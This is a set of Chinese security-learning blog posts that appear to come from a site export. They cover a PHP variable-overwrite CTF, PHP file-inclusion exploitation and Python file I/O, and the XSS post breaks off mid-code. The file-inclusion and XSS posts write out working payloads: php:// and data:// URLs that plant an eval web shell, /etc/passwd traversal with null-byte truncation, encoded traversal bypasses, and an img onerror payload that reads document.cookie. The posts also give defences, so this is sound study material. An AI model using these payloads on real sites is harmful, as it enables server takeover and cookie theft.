在foreach语句中，第一个是可以将GET的参数进行变量覆盖，第二个是将POST的参数进行变量覆盖，但两个语句的处理是有点区别的即一个键值为$$value另一个为$value。 这里整理一下思路： 因为POST的参数必须为flag，则第二个foreach语句的$key为flag，进而$$key为$flag，从而得到$flag的值为POST传递的flag参数的值。 又因为第二个foreach语句修改了$flag原来的值为POST传递的flag参数的值，因而最后一个if语句的条件是恒不成立的，在其后的else代码块逻辑中echo输出出来的只能是修改了的$flag的值即POST传递的flag参数的值而非原本的$flag的值、接着输出$_200变量的值。 要想输出原本的$flag的值，我们需要将原本的$flag覆盖$_200变量，因此在第一个foreach语句中通过GET输入_200=flag，从而得到的$$key为$_200 以及$$value为$flag，从而实现在修改$flag的值之前将其覆盖到$_200变量中。 验证结果： Reference 《白帽子讲Web安全》 PHP变量覆盖漏洞小小结——mi1k7ea PHP变量覆盖总结——Y4er PHP变量覆盖总结——p0sec","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"},{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"变量覆盖","slug":"变量覆盖","permalink":"http://ca0y1h.top/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Web安全学习之文件包含漏洞利用","date":"2019-11-15T13:03:40.000Z","path":"Web_security/basic_learning/13.文件包含漏洞利用/","text":"Web安全学习之文件包含漏洞利用 这一篇主要来聊一聊PHP的文件包含漏洞，主要包括本地文件包含（Local File Inclusion，LFI）、远程文件包含（Remote File Inclusion， RFI）和PHP伪协议的利用。 文件包含的基本概念 严格来说，文件包含漏洞是代码注入的一种，其原理就是注入一段用户能控制的脚本或代码，使服务器端执行。至于文件包含，也就是一种“外部数据流包含”，这个外部数据流可以是文件，也可以是POST数据流的形式。 对于PHP具体而言，有４个可利用的函数： 1234require()require_once()include()include_once() 当使用这4个函数包含一个新文件时该文件将作为PHP代码执行，PHP内核并不会判断该被包含的文件是什么类型。也就是说，如果被包含的txt文件、图片文件、远程URL都会作为PHP代码被执行。 举一个最简单的例子来看看： 123&lt;?phpinclude($_GET[test]); ?&gt; fortest.txt文件内容： 1234for test&lt;?phpphpinfo();?&gt; 页面结果： 要想成功利用文件包含漏洞，需要满足下面两个条件： include()等函数通过动态变量的方式引入需要包含的文件； 用户能控制该动态变量。 远程文件包含 如果PHP的配置选项allow_url_include为ON的话，则include/require函数是可以加载远程文件的，这种漏洞称为远程文件包含漏洞，比如： 1234&lt;?php $basePath = $_GET[&#x27;path&#x27;]; require_once $basePath . &quot;/action/m_share.php&quot;?&gt; 上面的代码看似将路径的后半段已经规定了，但利用HTTP参数还是有办法绕过： 1http:&#x2F;&#x2F;localhost&#x2F;FileInclude&#x2F;index.php?path&#x3D;http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;solution.php? 所以实际的执行代码就是： 1require_once &quot;http://localhost/FileInclude/index.php?path=http://localhost/test/solution.php?/action/m_share.php&quot; 即，问号&quot;?&quot;后面的代码被解释成URL的querystring，这也是一种&quot;截断&quot;思想，和%00一样。 防御方法：关闭远程文件包含的配置错误，即allow_url_include = Off 本地文件包含 能过打开并包含本地文件的漏洞，被称为本地文件包含漏洞。 看到这里，利用远程文件包含我们可以执行攻击者的任意代码，而本地文件包含漏洞只能查看或运行本地文件。但是，其实我们可以使用PHP的伪协议等方式来利用本地文件包含漏洞，接下来讲的是如下几种利用方式： PHP伪协议（较为通用） 包含Session文件 包含日志（较为通用） 包含environ文件 包含临时文件 包含上传文件 PHP伪协议 php://协议 12php:&#x2F;&#x2F;inputphp:&#x2F;&#x2F;filter php://input用于执行PHP代码，php://filter用于读取源码。 php://filter php://filter是一种元封装器，设计用于&quot;数据流打开&quot;时的&quot;筛选过滤&quot;应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启allow_url_include。 用法：?file=php://filter/convert.base64-encode/resource=xxx.php 假设页面的源代码index.php为： 1234567891011121314&lt;html&gt; &lt;title&gt;asdf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;;&#125; $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); ?&gt;&lt;/html&gt; 123url: http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.phpresult: PD9waHAgc3lzdGVtKCdpcGNvbmZpZycpOz8+ base64解密就可以看到内容，这里如果不进行base64_encode，则被include进来的代码就会被执行，导致看不到源代码。 php://input php://input协议主要用于访问各个输入/输出流。CTF中经常使用file_get_contents获取php://input内容(POST)，需要开启allow_url_include，并且当enctype=&quot;multipart/form-data&quot;的时候 php://input是无效的。 利用方式：?file=php://input 数据利用POST传过去 碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。 假设页面源代码为： 1234567&lt;?php$file = $_GET[&#x27;file&#x27;];if (@file_get_content($file) == &#x27;meizijiu&#x27;) &#123; echo $flag;&#125;?&gt; 直接使用Hackbar工具POST数据： 另外还可以写入一句话： 123456http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;php:&#x2F;&#x2F;inputpost数据:&lt;?php echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4&#x3D;&quot;));?&gt; data://协议 php.ini：allow_url_include=On、allow_url_fopen()都为On 利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中。 页面示例代码： 12345&lt;?phpecho &#x27;for test&#x27;;include($_GET[&#x27;file&#x27;]);?&gt; 123456http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZWNobyBmaWxlX3B1dF9jb250ZW50cygidGVzdC5waHAiLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoyTmpKMTBwUHo0PSIpKTs&#x2F;Pg&#x3D;&#x3D; 最后一个URL使用file_put_contents()函数将&lt;?php eval($_POST['cc'])?&gt;写到了test.php文件当中，如图： phar://协议 php版本 ≥ 5.3 phar://：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀，可以通过以下方式进行利用。 利用方式：写入一句话shell.php -&gt; 压缩为shell.zip -&gt; 修改后缀为shell.jpg -&gt;上传到网站 -&gt; phar://shell.jpg/shell.php 假设有个文件phpinfo.txt，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包，如下： 指定绝对路径： index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt zip://协议 php版本 ≥ 5.3 利用和构造zip包的方法同phar://协议，但使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。 12index.php?file&#x3D;zip:&#x2F;&#x2F;D:\\phpStudy\\WWW\\fileinclude\\test.zip%23phpinfo.txt 包含Session文件 前提条件：Session文件路径已知，且其中内容的部分可控。 首先第一个条件：Session的文件路径可以在php.ini中的session.save_handler字段查看到： 一般而言，session文件的存放位置为： /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID 第二个条件：内容可控，这个要求较为苛刻，有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。 包含日志文件 前提条件：要知道服务器日志的存储路径，且日志文件可读。 服务器一般回在Web Server的access_log里记录客户端的请求信息，在error_log里记录出错信息。所以攻击者可以间接地将PHP代码写入日志文件，在文件包含时，只需要包含日志文件即可。 但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。 正常的PHP代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。 包含environ文件 /proc/self/environ文件里面有Web进程运行时的环境变量，其中很多都是用户可以控制的，最常见的做法就是在User-Agent中注入PHP代码。 这里有很完整的利用过程说明： https://www.exploit-db.com/papers/12886 包含临时文件 以上这些方法都要求PHP能过包含这些不处于Web目录下的文件，如果PHP设置了open_basedir，则很可能会使得攻击失效。 php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\\winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。 另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考[LFI With PHPInfo Assistance](https://www.insomniasec.com/downloads/publications/LFI With PHPInfo Assistance.pdf) 包含上传文件 就给一道CTF的题吧，最近在玩这个，膜拜一下大佬写的脚本。 XMAN夏令营-2017-babyweb-writeup 绕过方式 比如下面这段代码： 1234567&lt;?php$file = $_GET[&#x27;file&#x27;];if (file_exists(&#x27;/home/wwwrun/&#x27;.$file.&#x27;.php&#x27;)) &#123; include &#x27;/home/wwwrun/&#x27;.$file.&#x27;.php&#x27;;&#125;?&gt; 这段代码把inlcude路径的前缀部分、后缀部分都给控制住了。相比于连路径的前缀都由用户控制的那种漏洞已经安全多了。但是这里存在几个问题。 00字符截断 这种方式需要 PHP版本&lt;=5.2 用户能够控制file参数，当file的值为../../etc/passwd\\0时，相当于执行了include '/home/wwwrun/../../etc/passwd'这条语句。 如果不适用\\0截断的话，被包含的文件实际上是/etc/passwd.php，但这个文件自然是不存在的。所以在这个地方，攻击者只要在最后加入一个0字节（\\x00），就能截断file变量之后的字符串。 如果是通过Web输入，只需要UrlEencode变为： 12..&#x2F;..&#x2F;etc&#x2F;passwd%00 防御方式：过滤\\00截断字符，过滤代码如下： 1234567891011&lt;?phpfunction getVal($name)&#123; $value = isset($_GET[$name]) ? $_GET[$name] : null; if (is_string($value)) &#123; $value = str_replace(&quot;\\0&quot;, &#x27;&#x27;, $value); &#125;&#125;?&gt; 超长字符截断 目录字符串在Windows下256字节、Linux下4096字节时，会达到最大值，最大值之后的字符被丢弃。可以通过./的方式构造目录： 1234.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;abc&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;abc..&#x2F;1&#x2F;abc..&#x2F;1&#x2F;abc..&#x2F;1&#x2F;abc 目录遍历 除了这种攻击方式，还可以使用&quot;…/…/…/“这样的方式来返回到上层目录中，这种方式又被称为&quot;目录遍历(Path Traversal)”。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF) ： 123456789%2e%2e%2f -&gt; ..&#x2F;%2e%2e&#x2F; -&gt; ..&#x2F;..%2f -&gt; ..&#x2F;%2e%2e%5c -&gt; ..\\%2e%2e%\\ -&gt; ..\\..%5c -&gt; ..\\%252e%252e%255c -&gt; ..\\..%255c -&gt; ..\\ 防御方式 目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。 open_basedir的作用是限制在某个特定目录下PHP能打开的文件。 需要注意的是，open_basedir的值是目录的前缀，如果设置如下： 1open_basedir &#x3D; &#x2F;home&#x2F;aaa 那么以下的目录都是被允许的： 123&#x2F;home&#x2F;aaa&#x2F;home&#x2F;aaa&#x2F;bbb&#x2F;home&#x2F;aaa&#x2F;ccc 如果要限定一个指定的目录，则需要在后面加上一个/： 1&gt;open_basedir &#x3D; &#x2F;home&#x2F;aaa&#x2F; URL绕过 query（?） 1index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt? 则包含的文件为 http://remoteaddr/remoteinfo.txt?/test/test.php 。 问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过。 fragment(#) 1index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt%23 则包含的文件为http://remoteaddr/remoteinfo.txt#/test/test.php 。 问号后面的部分/test/test.php，也就是指定的后缀被当作fragment从而被绕过。注意需要把#进行url编码为%23。 防御方式 综上，要防御LFI的漏洞，应该尽量避免包含动态的变量，尤其是用户可以控制的变量。一种变通的方式，则是使用枚举： 123456789101112131415&lt;?php $file = $_GET[&#x27;file&#x27;]; //whitelisting possible values switch($file) &#123; case &quot;main&quot;: case &quot;foo&quot;: case &quot;bar&quot;: include &quot;/home/wwwrun/include&quot; . $file . &quot;.php&quot;; break; default: include &quot;/home/wwwrun/include/main.php&quot;; &#125;?&gt; Reference 《白帽子讲Web安全》 PHP文件包含 [LFI、RFI、PHP封装协议安全问题学习 LFI以及RFI(文件包含)伪协议利用小技巧 LFIBoomCTF","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"文件包含","slug":"文件包含","permalink":"http://ca0y1h.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"PythonIO编程","date":"2019-11-11T00:58:27.000Z","path":"Python/code/6.PythonIO编程/","text":"PythonIO编程 主要记录Python的文件读写、文件和目录操作以及JSON序列化。 文件读写 所有模式的定义及含义可以参考Python的官方文档。 读文件 123456try: f = open(&#x27;/path/to/file&#x27;, &#x27;r&#x27;) print(f.read())finally: if f: f.close() 每次这样过于繁琐，Python引入了with语句自动帮我们调用close()方法： 12with open(&#x27;/path/to/file&#x27;, &#x27;r&#x27;) as f: print(f.read()) read()函数会一次性读取文件的全部内容，如果文件太大，Python程序就直接挂掉了，所以可以使用read(size)来指定每次最多读取size字节的内容，或者使用readline()和readlines()。 一般来说，如果文件较小，直接使用read()方法；如果不能确定文件大小，就反复调用read(size)方法；如果是配置文件，调用readlines()最方便： 12for line in f.readlines(): print(line.strip()) # 去掉&#x27;\\n&#x27; 像open()函数返回的这种有个read()方法的对象，在Python中称为file-like-object。除了file外，还可以是内存的字节流，网络流，自定义流。 二进制文件 123&gt;&gt;&gt; f = open(&#x27;/User/xxx/test.jpg&#x27;, &#x27;rb&#x27;)&gt;&gt;&gt; f.read()b&#x27;\\xff\\xd8\\xff\\xe1\\x00\\x18Exif\\x00\\x00...&#x27; # 十六进制表示的字节 字符编码 读取非Unicode编码的文件： 1&gt;&gt;&gt; f = open(&#x27;/User/xxx/gbk.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;gbk&#x27;) 如果遇到一些编码不规范的文件，open()函数还接收一个error参数。 1&gt;&gt;&gt; f.open(&#x27;\\User\\xxx\\gbk.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;gbk&#x27;, errors=&#x27;ignore&#x27;) 写文件 123&gt;&gt;&gt; f = open(&#x27;/User/xxx/test.txt&#x27;, &#x27;w&#x27;)&gt;&gt;&gt; f.write(&#x27;Hello, world!&#x27;)&gt;&gt;&gt; f.close() 只有调用close()方法时，操作系统才保证把没有写入的数据全部写入磁盘。忘记调用close()的后果是数据可能只写了一部分到磁盘，剩下的丢失了。所以，还是用with语句来得保险： 12with open(&#x27;/User/xxx/test.txt&#x27;, &#x27;w&#x27;) as f: f.write(&#x27;Hello, world&#x27;) 如果我们希望追加到文件末尾怎么办？可以传入'a'以追加（append）模式写入。 StringIO和BytesIO StringIO 写入 123456789&gt;&gt;&gt; f = StringIO()&gt;&gt;&gt; f. write(&#x27;Hello&#x27;)5&gt;&gt;&gt; f.write(&#x27; &#x27;)1&gt;&gt;&gt; f.write(&#x27;world!&#x27;)6&gt;&gt;&gt; print(f.getvalue())Hello world! getvalue()方法用于获得写入后的str。 读取 要读取StringIO，可以用一个str初始化StringIO，然后像读取文件一样读取： 12345678910&gt;&gt;&gt; f = StringIO(&#x27;Hello!\\nHi!\\nGoogbye!&#x27;)&gt;&gt;&gt; while True:... s = f.readline()... if s == &#x27;&#x27;:... break... print(s.strip())... Hello!Hi!Googbye! BytesIO 写入 BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes： 123456&gt;&gt;&gt; from io import BytesIO&gt;&gt;&gt; f = BytesIO()&gt;&gt;&gt; f.write(&#x27;中文&#x27;.encode(&#x27;utf-8&#x27;))6&gt;&gt;&gt; print(f.getvalue())b&#x27;\\xe4\\xb8\\xad\\xe6\\x96\\x87&#x27; 请注意，写入的不是str，而是经过UTF-8编码的bytes。 读取 和StringIO类似，可以用一个bytes初始化BytesIO，然后，像读文件一样读取： 1234&gt;&gt;&gt; from io import BytesIO&gt;&gt;&gt; f = BytesIO(b&#x27;\\xe4\\xb8\\xad\\xe6\\x96\\x87&#x27;)&gt;&gt;&gt; f.read()b&#x27;\\xe4\\xb8\\xad\\xe6\\x96\\x87&#x27; 操作文件和目录 操作目录 12345678# 查看当前目录的绝对路径&gt;&gt;&gt; os.path.abspath(.)# 在某个目录下创建一个新目录，首先把新目录的完整路径表示出来&gt;&gt;&gt; os.path.join(&#x27;/Users/xxx&#x27;, &#x27;testdir&#x27;)# 然后创建一个目录&gt;&gt;&gt; os.mkdir(&#x27;/Users/xxx/testdir&#x27;)# 删掉一个目录&gt;&gt;&gt; os.rmdir(&#x27;/Users/xxx/testdir&#x27;) 把两个路径合成一个时，不要直接拼字符串，而要通过os.path.join()函数，这样可以正确处理不同操作系统的路径分隔符。 同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os.path.split()函数，这样可以把一个路径拆分为两部分，后一部分总是最后级别的目录或文件名： 12&gt;&gt;&gt; os.path.split(&#x27;/Users/xxx/testdir/test.txt&#x27;)(&#x27;/Users/xxx/testdir&#x27;, &#x27;test.txt&#x27;) os.path.splitext()可以直接得到文件扩展名： 12&gt;&gt;&gt;os.path.splitext(&#x27;/Users/xxx/testdir/test.txt&#x27;)(&#x27;/Users/xxx/testdir/test&#x27;, &#x27;.txt&#x27;) 操作文件 假定当前目录下有一个test.txt文件： 1234# 对文件重命名&gt;&gt;&gt; os.rename(&#x27;test.txt&#x27;, &#x27;test.py&#x27;)# 删除文件&gt;&gt;&gt; os.removez(&#x27;test.py&#x27;) Python的os模块没有提供文件的复制操作，但是在shutil模块提供了很多中不同需求的文件复制操作。 shutil.copyfileobj(文件1，文件2)：将文件1的数据覆盖copy给文件2 1234567import shutilf1 = open(&quot;1.txt&quot;,encoding=&quot;utf-8&quot;)f2 = open(&quot;2.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)shutil.copyfileobj(f1,f2) shutil.copy(文件1，文件2)：拷贝文件和权限都进行copy。 shutil.move(源文件，指定路径)：递归移动一个文件。 shutil.copytree(源目录，目标目录)：可以递归copy多个目录到指定目录。 过滤文件 列出当前目录下的所有目录： 1&gt;&gt;&gt; [x for x in os.listdir(&#x27;.&#x27;) if os.path.isdir(x)] 列出指定后缀名的文件： 1&gt;&gt;&gt; [x for x in os.listdir(&#x27;x&#x27;) if os.path.isfile(x) and os.path.splitext(x)[1] == &#x27;py&#x27;] 序列化 Python提供了pickle模块来实现序列化。 首先，把一个对象序列化并写入文件： 1234&gt;&gt;&gt; import pickle&gt;&gt;&gt; d = dict(name=&#x27;Bob&#x27;, age=20, score=88)&gt;&gt;&gt; pickle.dumps(d)b&#x27;\\x80\\x03&#125;q\\x00(X\\x03\\x00\\x00\\x00ageq\\x01K\\x14X\\x05\\x00\\x00\\x00scoreq\\x02KXX\\x04\\x00\\x00\\x00nameq\\x03X\\x03\\x00\\x00\\x00Bobq\\x04u.&#x27; pickle.dumps()方法把任意对象序列化成一个bytes，然后，就可以把这个bytes写入文件。还有一个pickle.dump()方法，它直接把对象序列化后写入一个file-like Object： 123&gt;&gt;&gt; f = open(&#x27;dump.txt&#x27;, &#x27;wb&#x27;)&gt;&gt;&gt; pickle.dump(d, f)&gt;&gt;&gt; f.close() 当我们要把对象从磁盘读到内存时，可以先把内容读到一个bytes，然后用pickle.loads()方法反序列化出对象，也可以用pickle.load()方法直接从一个file-like Object中直接反序列化出对象。 12345&gt;&gt;&gt; f = open(&#x27;dump.txt&#x27;, &#x27;rb&#x27;)&gt;&gt;&gt; d = pickle.load(f)&gt;&gt;&gt; f.close()&gt;&gt;&gt; d&#123;&#x27;age&#x27;: 20, &#x27;score&#x27;: 88, &#x27;name&#x27;: &#x27;Bob&#x27;&#125; JSON JSON和Python内置的数据类型对应如下： JSON类型 Python类型 {} dict [] list “string” str 1234.56 int或float true/false True/False null None Python对象—&gt;JSON对象 1234&gt;&gt;&gt; import json&gt;&gt;&gt; d = dict(name=&#x27;Bob&#x27;, age=20, score=88)&gt;&gt;&gt; json.dumps(d)&#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27; dumps()方法返回一个str，内容就是标准的JSON。类似的，dump()方法可以直接把JSON写入一个file-like Object。 JSON对象—&gt;Python对象 要把JSON反序列化为Python对象，用loads()或者对应的load()方法，前者把JSON的字符串反序列化，后者从file-like Object中读取字符串并反序列化： 123&gt;&gt;&gt; json_str = &#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;&gt;&gt;&gt; json.loads(json_str)&#123;&#x27;age&#x27;: 20, &#x27;score&#x27;: 88, &#x27;name&#x27;: &#x27;Bob&#x27;&#125; 如果想对一个class对象进行序列化操作，我们应该怎么做呢？ https://docs.python.org/3/library/json.html#json.dumps 可以看到参数列表中dumps()的参数列表提供一个default选项。 defalut：To use a custom JSONEncoder subclass (e.g. one that overrides the default() method to serialize additional types), specify it with the cls kwarg; otherwise JSONEncoder is used. 也就是说如果要序列化一个class对象，我们必须自己写一个序列化的过程，不然Python是不知道如何对一个class对象进行序列化操作的。 123456789101112class Student(object): def __init__(self, name, age, score): self.name = name self.age = age self.score = score def student2dict(std): return &#123; &#x27;name&#x27;: std.name &#x27;age&#x27;: std.age &#x27;score&#x27;: std.score &#125; 这样，Student实例首先被student2dict()函数转换成dict，然后再被序列化为JSON： 123&gt;&gt;&gt; s = Student(&#x27;Bob&#x27;, 20, 88)&gt;&gt;&gt; print(json.dumps(s, defalut=student2dict))&#123;&quot;age&quot;: 20, &quot;name&quot;: &quot;Bob&quot;, &quot;score&quot;: 88&#125; 但是为每一个class写一个类似转化函数未免代码的重复率有点太高。 1print(json.dumps(s, default=lambda obj: obj.__dict__)) 通常class的实例都有一个__dict__属性，它就是一个dict，用来存储实例变量，所以我们可以直接使用__dict__属性。 如果我们要把JSON反序列化为一个Student对象实例，loads()方法首先转换出一个dict对象，然后，我们传入的object_hook函数负责把dict转换为Student实例： 12def dict2student(d): return Student(d[&#x27;name&#x27;], d[&#x27;age&#x27;], d[&#x27;score&#x27;]) 结果如下： 123&gt;&gt;&gt; json_str = &#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;&gt;&gt;&gt; print(json.loads(json_str, object_hook=dict2student))&lt;__main__.Student object at 0x10cd3c190&gt;","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"},{"name":"IO编程","slug":"IO编程","permalink":"http://ca0y1h.top/tags/IO%E7%BC%96%E7%A8%8B/"}],"categories":[{"name":"编程","slug":"编程","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"编程/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"}]},{"title":"Web安全学习之XSS漏洞实战学习","date":"2019-11-09T08:16:21.000Z","path":"Web_security/basic_learning/12.XSS漏洞实战学习/","text":"Web安全学习之XSS漏洞实战学习 编写一个存在 xss 漏洞的页面 利用 xss 漏洞获取当前用户 cookie 思考，利用 xss 漏洞能干嘛（参考 beef） 扩展学习：学习如何防御 xss、总结防御策略加到报告里 要求：记录编写的页面代码、操作流程、思考总结 0x01 XSS漏洞 XSS(Cross Site Scripting)跨站脚本攻击，也是一种注入攻击，当web应用对用户输入过滤不严格，攻击者写入恶意的脚本代码（HTML、JavaScript）到网页中时，如果用户访问了含有恶意代码的页面，恶意脚本就会被浏览器解析执行导致用户被攻击。 常见的危害有：cookie窃取，session劫持，钓鱼攻击，蠕虫，ddos等。 0x02 XSS漏洞分类和代码案例 反射型XSS 原理 反射型xss一般出现在URL参数中及网站搜索栏中，由于需要点击包含恶意代码的URL才可以触发，并且只能触发一次，所以也被称”非持久性xss”。 代码案例 Low Level 漏洞代码： 123456789&lt;?php // Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;setcookie(&quot;Cookie&quot;, &quot;Test&quot;);?&gt; 漏洞利用： Medium Level 漏洞代码： 12345678910&lt;?phpif (array_key_exists(&quot;name&quot;, $_GET) &amp;&amp; $_GET[&#39;name&#39;] !&#x3D; NULL) &#123; $name &#x3D; str_replace(&#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[&#39;name&#39;]); echo &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;&#x2F;pre&gt;&quot;;&#125;setcookie(&quot;Medium&quot;, &quot;CookieTest&quot;);?&gt; 漏洞利用： 双写&lt;script&gt;标签：&lt;s&lt;script&gt;cript&gt; 标签转换大小写：&lt;SCRipt&gt; High Level 漏洞代码： 123456789101112&lt;?php &#x2F;&#x2F; Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123; &#x2F;&#x2F; Get input $name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] ); &#x2F;&#x2F; Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;&#125; ?&gt; 漏洞利用： 这里使用了正则表达式过滤了&lt;script&gt;标签， 这时候不论是大小写、双层&lt;script&gt;都无法绕过，此时可以使用别的标签，比如&lt;img&gt;。 payload： &lt;img src=0 onerror=alert(document.cookie)&gt; 存储型XSS 原理 允许用户提交数据的Web应用程序都有可能会出现存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器接收并存储，当攻击者再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这就是存储型XSS。 代码案例 Low Level 前端页面代码： 123456789101112131415161718&lt;form method=&quot;post&quot; name=&quot;guestform&quot; action=&quot;low.php&quot;&gt; &lt;table width=&quot;550&quot; border=&quot;0&quot; cellpadding=&quot;2&quot; cellspacing=&quot;1&quot;&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;Name *&lt;/td&gt; &lt;td&gt; &lt;input name=&quot;txtName&quot; type=&quot;text&quot; size=&quot;30&quot; maxlength=&quot;10&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;Message *&lt;/td&gt; &lt;td&gt; &lt;textarea name=&quot;mtxMessage&quot; cols=&quot;50&quot; rows=&quot;3&quot; maxlength=&quot;50&quot;&gt;&lt;/textarea&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td width=&quot;100&quot;&gt;&amp;nbsp;&lt;/td&gt; &lt;td&gt; &lt;input name=&quot;btnSign&quot; type=&quot;submit&quot; value=&quot;Sign Guestbook&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/form&gt; 服务器端代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phperror_reporting(E_ALL);if(isset($_POST[&#x27;btnSign&#x27;]))&#123; $servername = &quot;localhost&quot;; $username = &quot;root&quot;; $password = 